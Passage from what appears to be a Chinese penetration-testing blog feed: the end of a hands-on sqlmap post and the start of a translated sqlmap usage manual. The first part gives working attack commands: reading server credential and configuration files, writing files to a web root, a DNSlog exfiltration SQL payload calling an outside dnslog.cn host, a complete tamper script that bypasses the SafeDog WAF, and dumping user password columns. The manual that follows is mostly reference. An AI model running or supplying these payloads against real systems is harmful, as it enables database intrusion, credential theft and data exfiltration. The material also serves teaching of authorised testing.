src="/2021/11/09/day33/image-20211110204607120.png" alt="image-20211110204607120"></p><p>可以看到弹出了一个交互式shell，可以执行命令，如果可以回显就可以看到返回的命令信息</p><h3 id="读取和写入文件"><a href="#读取和写入文件" class="headerlink" title="读取和写入文件"></a>读取和写入文件</h3><p>–file-read 读取文件 读取文件首先要知道路径,才能读取</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --file-read="C:/Windows/System32/inetsrv/MetaBase.xml" --threads=10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>C:/Windows/System32/inetsrv/MetaBase.xml 可以换成其他文件路径 如果是linux 可以读取/etc/passwd</p><p><img src="/2021/11/09/day33/image-20211110204911803.png" alt="image-20211110204911803"></p><p>读取后的文件在路径给出了</p><p><img src="/2021/11/09/day33/image-20211110205040324.png" alt="image-20211110205040324"></p><p>–file-write 写入文件</p><p>–file-write 目标路径 –file-dest 文件路径</p><p>write写本地要写入的文件路径，dest写网站服务器上的文件路径</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm1.com/inj.aspx?id=1" --file-write="C:\Users\Administrator\Desktop\1.txt" --file-dest="C:\Hws.com\HwsHostMaster\wwwroot\dm1.com\web\1.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110205631333.png" alt="image-20211110205631333"></p><p>执行完后发现多了个1.txt</p><h3 id="dnslog盲注"><a href="#dnslog盲注" class="headerlink" title="dnslog盲注"></a>dnslog盲注</h3><p>适合没有回显时，把注入数据发送到远程dnslog上</p><p>–sql-shell 调用sql交互shell，可以执行sql命令</p><pre class="line-numbers language-none"><code class="language-none">declare @s varchar(5000),@host varchar(5000) set @s=(host_name()) set @host=CONVERT(varchar(5000),@s)+'.2kbg3j.dnslog.cn';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110210413131.png" alt="image-20211110210413131"></p><p><img src="/2021/11/09/day33/image-20211110210421667.png" alt="image-20211110210421667"></p><p>可以看到hostname拿到了</p><h2 id="实战六"><a href="#实战六" class="headerlink" title="实战六"></a>实战六</h2><h3 id="编写tamper模块绕过waf"><a href="#编写tamper模块绕过waf" class="headerlink" title="编写tamper模块绕过waf"></a>编写tamper模块绕过waf</h3><p>首先我们要判断waf的厂商，新版sqlmap回自动执行waf检测</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110210937332.png" alt="image-20211110210937332"></p><p>在SQL注入中，经常会遇到各种厂商的waf,绕过之后经常手工提交，这样显得特别慢，特别是要注入得到数据的时，手工获取的信息太慢，这个时候可以用编写sqlmap的tamper模块进行注入，自动化进行操作，这样就方便得多了。</p><p>这里是的waf是安全狗</p><p><img src="/2021/11/09/day33/image-20211110211346028.png" alt="image-20211110211346028"></p><p>拦截了http user_agent头，我们用–random-agent绕过了</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1 --random-agent --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110211604342.png" alt="image-20211110211604342"></p><p>可以看到出了库，但是当查表时发现sql查询没有返回东西</p><p><img src="/2021/11/09/day33/image-20211110211841826.png" alt="image-20211110211841826"></p><p>觉得应该是sql语句的问题，做了拦截</p><p><img src="/2021/11/09/day33/image-20211110211927825.png" alt="image-20211110211927825"></p><p>分析得到绕过安全狗的payload</p><pre class="line-numbers language-none"><code class="language-none">--/*%0a这里是你的填写你的注入语句--%20*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的原理</p><p><img src="/2021/11/09/day33/image-20211110212907729.png" alt="image-20211110212907729"></p><p>可以看到命令被执行，注释里面的没有执行，我们在*后加个enter符号</p><p><img src="/2021/11/09/day33/image-20211110213004444.png" alt="image-20211110213004444"></p><p>可以看到注释里面的东西被执行了</p><p>%0a即回车，我们把注入语句放到里面就会被正常执行了</p><p>写好的tamper模块</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python"""Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permissionAuthor:pureqh.top"""import reimport osfrom lib.core.data import kbfrom lib.core.enums import PRIORITYfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMS__priority__ = PRIORITY.LOW # 优先级设置def dependencies():    singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL)) #描述# tamper函数为自定义你的payloaddef tamper(payload, **kwargs):        payload=payload.replace('AND','--/*%0aAND')#关键词替换        payload=payload.replace('ORDER','--/*%0aORDER')        payload=payload.replace('UNION','--/*%0aunion')        payload+='--%20*/'#追加字符串        return payload #返回最终的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们使用它即可绕过iis</p><p><img src="/2021/11/09/day33/image-20211110213517121.png" alt="image-20211110213517121"></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1 --random-agent --tamper bypass_safe_dog.py --technique=U -D Angelcms --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110213705450.png" alt="image-20211110213705450"></p><p>可以看到成功绕过了</p><h3 id="暴力穷举"><a href="#暴力穷举" class="headerlink" title="暴力穷举"></a>暴力穷举</h3><p>在access和mysql4.0数据库 没有内置库，针对这类数据库sqlmap使用字典穷举的方法对表进行猜解。</p><p>sqlmap内置的字典</p><p><img src="/2021/11/09/day33/image-20211110215513123.png" alt="image-20211110215513123"></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110220219997.png" alt="image-20211110220219997"></p><p>这里询问字典，1是使用系统自带字典，2为自定义字典</p><p>出来表后我们继续穷举字段</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access -T i_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110220658238.png" alt="image-20211110220658238"></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access -T i_user -C "u_id,u_pass,u_user" --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211110220824329.png" alt="image-20211110220824329"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/2021/10/28/day32/"/>
      <url>/2021/10/28/day32/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用手册"><a href="#sqlmap使用手册" class="headerlink" title="sqlmap使用手册"></a>sqlmap使用手册</h1><p>收集sqlmap的文章集合规划，方便自己使用</p><span id="more"></span><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>sqlmap是一个开源的渗透测试工具，它可以自动化检测和利用SQL注入漏洞并接管数据库服务器。它有一个强大的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项，从数据库指纹、数据获取到访问底层文件系统、执行操作系统命令。 </p><p>SQLMAP支持的<strong>六</strong>种不同的注入方式</p><p>B:Boolean-basedblindSQLinjection（布尔型注入）<br>E:Error-basedSQLinjection（报错型注入）<br>U:UNIONquerySQLinjection（可联合查询注入）<br>S:StackedqueriesSQLinjection（可多语句查询注入）<br>T:Time-basedblindSQLinjection（基于时间延迟注入）<br>Q:InlineSQLInjection(内联注入)</p><h2 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h2><pre class="line-numbers language-none"><code class="language-none">用法：python sqlmap.py [选项]选项：  -h, --help            显示基本帮助信息并退出  -hh                   显示高级帮助信息并退出  --version             显示程序版本信息并退出  -v VERBOSE            输出信息详细程度级别：0-6（默认为 1）  目标：      至少提供一个以下选项以指定目标    -d DIRECT           直接连接数据库    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址    -x SITEMAPURL       从远程网站地图（.xml）文件中解析目标    -m BULKFILE         从文本文件中获取批量目标    -r REQUESTFILE      从文件中读取 HTTP 请求    -g GOOGLEDORK       使用 Google dork 结果作为目标    -c CONFIGFILE       从 INI 配置文件中加载选项  请求：      以下选项可以指定连接目标地址的方式    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）    --data=DATA         使用 POST 发送数据串    --param-del=PARA..  设置参数值分隔符    --cookie=COOKIE     指定 HTTP Cookie     --cookie-del=COO..  设置 cookie 分隔符    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数    --user-agent=AGENT  指定 HTTP User-Agent    --random-agent      使用随机的 HTTP User-Agent    --host=HOST         指定 HTTP Host    --referer=REFERER   指定 HTTP Referer    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）    --auth-cred=AUTH..  HTTP 认证凭证（username:password）    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件    --ignore-code=IG..  忽略 HTTP 错误码（例如：401）    --ignore-proxy      忽略系统默认代理设置    --ignore-redirects  忽略重定向尝试    --ignore-timeouts   忽略连接超时    --proxy=PROXY       使用代理连接目标 URL    --proxy-cred=PRO..  使用代理进行认证（username:password）    --proxy-file=PRO..  从文件中加载代理列表    --tor               使用 Tor 匿名网络    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））    --check-tor         检查是否正确使用了 Tor    --delay=DELAY       设置每个 HTTP 请求的延迟秒数    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）    --retries=RETRIES   连接超时时重试次数（默认为 3）    --randomize=RPARAM  随机更改给定的参数值    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：                        有些网站在你连续多次访问错误地址时会关闭会话连接，                        后面的“请求”小节有详细说明）    --safe-post=SAFE..  使用 POST 方法发送合法的数据    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求    --safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求    --skip-urlencode    不对 payload 数据进行 URL 编码    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token    --csrf-url=CSRFURL  指定可提取反 CSRF 攻击 token 的 URL    --force-ssl         强制使用 SSL/HTTPS    --hpp               使用 HTTP 参数污染攻击    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）  优化：    以下选项用于优化 sqlmap 性能    -o                  开启所有优化开关    --predict-output    预测常用请求的输出    --keep-alive        使用持久的 HTTP(S) 连接    --null-connection   仅获取页面大小而非实际的 HTTP 响应    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）  注入：    以下选项用于指定要测试的参数，    提供自定义注入 payloads 和篡改参数的脚本    -p TESTPARAMETER    指定需要测试的参数    --skip=SKIP         指定要跳过的参数    --skip-static       指定跳过非动态参数    --param-exclude=..  用正则表达式排除参数（例如："ses"）    --dbms=DBMS         指定 DBMS 类型（例如：MySQL）    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）    --os=OS             指定 DBMS 服务器的操作系统类型    --invalid-bignum    将无效值设置为大数    --invalid-logical   对无效值使用逻辑运算    --invalid-string    对无效值使用随机字符串    --no-cast           关闭 payload 构造机制    --no-escape         关闭字符串转义机制    --prefix=PREFIX     注入 payload 的前缀字符串    --suffix=SUFFIX     注入 payload 的后缀字符串    --tamper=TAMPER     用给定脚本修改注入数据  检测：    以下选项用于自定义检测方式    --level=LEVEL       设置测试等级（1-5，默认为 1）    --risk=RISK         设置测试风险等级（1-3，默认为 1）    --string=STRING     用于确定查询结果为真时的字符串    --not-string=NOT..  用于确定查询结果为假时的字符串    --regexp=REGEXP     用于确定查询结果为真时的正则表达式    --code=CODE         用于确定查询结果为真时的 HTTP 状态码    --text-only         只根据页面文本内容对比页面    --titles            只根据页面标题对比页面  技术：    以下选项用于调整特定 SQL 注入技术的测试方法    --technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：                        B: Boolean-based blind SQL injection（布尔型盲注）                        E: Error-based SQL injection（报错型注入）                        U: UNION query SQL injection（联合查询注入）                        S: Stacked queries SQL injection（堆查询注入）                        T: Time-based blind SQL injection（时间型盲注）                        Q: inline Query injection（内联查询注入）    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）    --union-cols=UCOLS  设置联合查询注入测试的列数目范围    --union-char=UCHAR  用于暴力猜解列数的字符    --union-from=UFROM  设置联合查询注入 FROM 处用到的表    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：                        推荐阅读《在SQL注入中使用DNS获取数据》                        http://cb.drops.wiki/drops/tips-5283.html，                        在后面的“技术”小节中也有相应解释）    --second-order=S..  设置二阶响应的结果显示页面的 URL（译者注：                        该选项用于二阶 SQL 注入）  指纹识别：    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别  枚举：      以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。      此外，还可以运行你输入的 SQL 语句    -a, --all           获取所有信息、数据    -b, --banner        获取 DBMS banner    --current-user      获取 DBMS 当前用户    --current-db        获取 DBMS 当前数据库    --hostname          获取 DBMS 服务器的主机名    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）    --users             枚举出 DBMS 所有用户    --passwords         枚举出 DBMS 所有用户的密码哈希    --privileges        枚举出 DBMS 所有用户特权级    --roles             枚举出 DBMS 所有用户角色    --dbs               枚举出 DBMS 所有数据库    --tables            枚举出 DBMS 数据库中的所有表    --columns           枚举出 DBMS 表中的所有列    --schema            枚举出 DBMS 所有模式    --count             获取数据表数目    --dump              导出 DBMS 数据库表项    --dump-all          导出所有 DBMS 数据库表项    --search            搜索列，表和/或数据库名    --comments          获取 DBMS 注释    -D DB               指定要枚举的 DBMS 数据库    -T TBL              指定要枚举的 DBMS 数据表    -C COL              指定要枚举的 DBMS 数据列    -X EXCLUDECOL       指定要排除的 DBMS 数据列    -U USER             指定枚举的 DBMS 用户    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库    --pivot-column=P..  指定主列    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句    --start=LIMITSTART  指定要导出的数据表条目开始行数    --stop=LIMITSTOP    指定要导出的数据表条目结束行数    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位    --last=LASTCHAR     指定获取返回查询结果的结束字符位    --sql-query=QUERY   指定要执行的 SQL 语句    --sql-shell         调出交互式 SQL shell    --sql-file=SQLFILE  执行文件中的 SQL 语句  暴力破解：    以下选项用于暴力破解测试    --common-tables     检测常见的表名是否存在    --common-columns    检测常用的列名是否存在  用户自定义函数注入：    以下选项用于创建用户自定义函数    --udf-inject        注入用户自定义函数    --shared-lib=SHLIB  共享库的本地路径  访问文件系统：    以下选项用于访问后端数据库管理系统的底层文件系统    --file-read=RFILE   读取后端 DBMS 文件系统中的文件    --file-write=WFILE  写入后端 DBMS 文件系统中的文件    --file-dest=DFILE   使用文件绝对路径写入到后端 DBMS  访问操作系统：    以下选项用于访问后端数据库管理系统的底层操作系统    --os-cmd=OSCMD      执行操作系统命令    --os-shell          调出交互式操作系统 shell    --os-pwn            调出 OOB shell，Meterpreter 或 VNC    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC    --os-bof            利用存储过程的缓冲区溢出    --priv-esc          数据库进程用户提权    --msf-path=MSFPATH  Metasploit 框架的本地安装路径    --tmp-path=TMPPATH  远程临时文件目录的绝对路径  访问 Windows 注册表：    以下选项用于访问后端数据库管理系统的 Windows 注册表    --reg-read          读取一个 Windows 注册表键值    --reg-add           写入一个 Windows 注册表键值数据    --reg-del           删除一个 Windows 注册表键值    --reg-key=REGKEY    指定 Windows 注册表键    --reg-value=REGVAL  指定 Windows 注册表键值    --reg-data=REGDATA  指定 Windows 注册表键值数据    --reg-type=REGTYPE  指定 Windows 注册表键值类型  通用选项：    以下选项用于设置通用的参数    -s SESSIONFILE      从文件（.sqlite）中读入会话信息    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件    --batch             从不询问用户输入，使用默认配置    --binary-fields=..  具有二进制值的结果字段（例如："digest"）    --check-internet    在访问目标之前检查是否正常连接互联网    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）    --eta               显示每个结果输出的预计到达时间    --flush-session     清空当前目标的会话文件    --forms             解析并测试目标 URL 的表单    --fresh-queries     忽略存储在会话文件中的查询结果    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中    --hex               获取数据时调用 DBMS 的 hex 函数    --output-dir=OUT..  自定义输出目录路径    --parse-errors      从响应中解析并显示 DBMS 错误信息    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件    --scope=SCOPE       用正则表达式从提供的代理日志中过滤目标    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试    --update            更新 sqlmap  其他选项：    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）    --alert=ALERT       在找到 SQL 注入时运行 OS 命令    --answers=ANSWERS   设置问题答案（例如：“quit=N,follow=N”）    --beep              出现问题提醒或在发现 SQL 注入时发出提示音    --cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表    --dependencies      检查 sqlmap 缺少什么（非核心）依赖    --disable-coloring  关闭彩色控制台输出    --gpage=GOOGLEPAGE  指定页码使用 Google dork 结果    --identify-waf      针对 WAF/IPS/IDS 保护进行彻底的测试    --mobile            使用 HTTP User-Agent 模仿智能手机    --offline           在离线模式下工作（仅使用会话数据）    --purge-output      安全地删除输出目录的所有内容    --skip-waf          跳过启发式检测 WAF/IPS/IDS 保护    --smart             只有在使用启发式检测时才进行彻底的测试    --sqlmap-shell      调出交互式 sqlmap shell    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）    --wizard            适合初级用户的向导界面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://sqlmap.com/index.php?id=1 -v 1 sqlmap -u "http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>-u  和–url参数一样 都是代表填写测试的url连接，如果存在&amp;符号需要添加把url放在双引号内</p><p>-v 表示  输出信息详细程度级别：0-6（默认为 1）</p><pre class="line-numbers language-none"><code class="language-none">0：只显示Python回源（tracebacks），错误（error）和关键（criticle)信息。1：同时显示信息(info)和警告信息（warning)（默认为1）2: 同时显示调试信息（debug）3：同时显示注入的有效载荷（payloads）4：同时显示http请求5：同时显示http响应头6：同时显示http响应内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>级别越高，信息就越详细，根据需求选择合适的输出信息。</p><h3 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h3><p><strong>指定某个url进行测试</strong> </p><p>sqlmap -u <a href="http://sqlmap.com/index.php?id=1">http://sqlmap.com/index.php?id=1</a> -v 1 </p><p><strong>从文件中加载http请求测试</strong></p><p>sqlmap -r url.txt </p><p><strong>从burpsuite或者日志读取http包</strong> </p><p>sqlmap -l post.txt</p><p><strong>从文本中获取多个目标扫描</strong></p><p>sqlmap -m url.xt </p><pre class="line-numbers language-none"><code class="language-none">http://www.moonsec.com/index.php?id=1http://www.moonsec.com/new.php?id=1http://www.moonsec.com/awd.php?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>从谷歌引擎搜索结果扫描</strong></p><p>sqlmap可以测试注入google的搜索结果中的get参数</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -g "inurl:\".php?id=1\""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><h4 id="http数据"><a href="#http数据" class="headerlink" title="http数据"></a>http数据</h4><p>参数 –data</p><p>此参数是把数据以post方式提交，sqlmap会自动检测post参数</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://192.168.0.103/06/vul/sqli/sqli_id.php --data="id=1&amp;submit=查询"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="参数拆分字符"><a href="#参数拆分字符" class="headerlink" title="参数拆分字符"></a>参数拆分字符</h4><p>参数：–param-del</p><p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h4><p>参数：–cookie,–load-cookies,–drop-set-cookie</p><p>这个参数在以下两个方面很有用：</p><p>1、web应用需要登陆的时候。</p><p>2、你想要在这些头参数中测试SQL注入时。</p><p>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。</p><p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p><p>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。</p><p>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。<strong>当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</strong></p><h4 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h4><p>参数：–user-agent,–random-agent</p><p>默认情况下sqlmap的HTTP请求头中User-Agent值是：</p><p>可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。</p><p><strong>当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</strong></p><h4 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h4><p>参数：–referer</p><p>sqlmap可以在请求中伪造HTTP中的referer，<strong>当–level参数设定为3或者3以上的时候会尝试对referer注入。</strong></p><h4 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h4><p>参数：–headers</p><p>可以通过–headers参数来增加额外的http头</p><h4 id="HTTP认证保护"><a href="#HTTP认证保护" class="headerlink" title="HTTP认证保护"></a>HTTP认证保护</h4><p>参数：–auth-type,–auth-cred</p><p>这些参数可以用来登陆HTTP的认证保护支持三种方式：</p><ol><li>Basic</li><li>Digest</li><li>NTLM</li></ol><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="HTTP协议的证书认证"><a href="#HTTP协议的证书认证" class="headerlink" title="HTTP协议的证书认证"></a>HTTP协议的证书认证</h4><p>参数：–auth-cert</p><p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。</p><p>key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p><h4 id="HTTP-S-代理"><a href="#HTTP-S-代理" class="headerlink" title="HTTP(S)代理"></a>HTTP(S)代理</h4><p>参数：–proxy,–proxy-cred和–ignore-proxy</p><p>使用–proxy代理是格式为：<a href="http://url:port。">http://url:port。</a></p><p>当HTTP(S)代理需要认证是可以使用–proxy-cred参数：username:password。</p><p>–ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</p><h4 id="HTTP请求延迟"><a href="#HTTP请求延迟" class="headerlink" title="HTTP请求延迟"></a>HTTP请求延迟</h4><p>参数：–delay</p><p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><h4 id="设定超时时间"><a href="#设定超时时间" class="headerlink" title="设定超时时间"></a>设定超时时间</h4><p>参数：–timeout</p><p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p><h4 id="设定重试超时"><a href="#设定重试超时" class="headerlink" title="设定重试超时"></a>设定重试超时</h4><p>参数：–retries</p><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p><h4 id="设定随机改变的参数值"><a href="#设定随机改变的参数值" class="headerlink" title="设定随机改变的参数值"></a>设定随机改变的参数值</h4><p>参数：–randomize</p><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p><h4 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h4><p>参数：–scope</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="避免过多的错误请求被屏蔽"><a href="#避免过多的错误请求被屏蔽" class="headerlink" title="避免过多的错误请求被屏蔽"></a>避免过多的错误请求被屏蔽</h4><p>参数：–safe-url,–safe-freq</p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p>绕过这个策略有两种方式：</p><ol><li>–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li><li>–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</li></ol><h4 id="关掉URL参数值编码"><a href="#关掉URL参数值编码" class="headerlink" 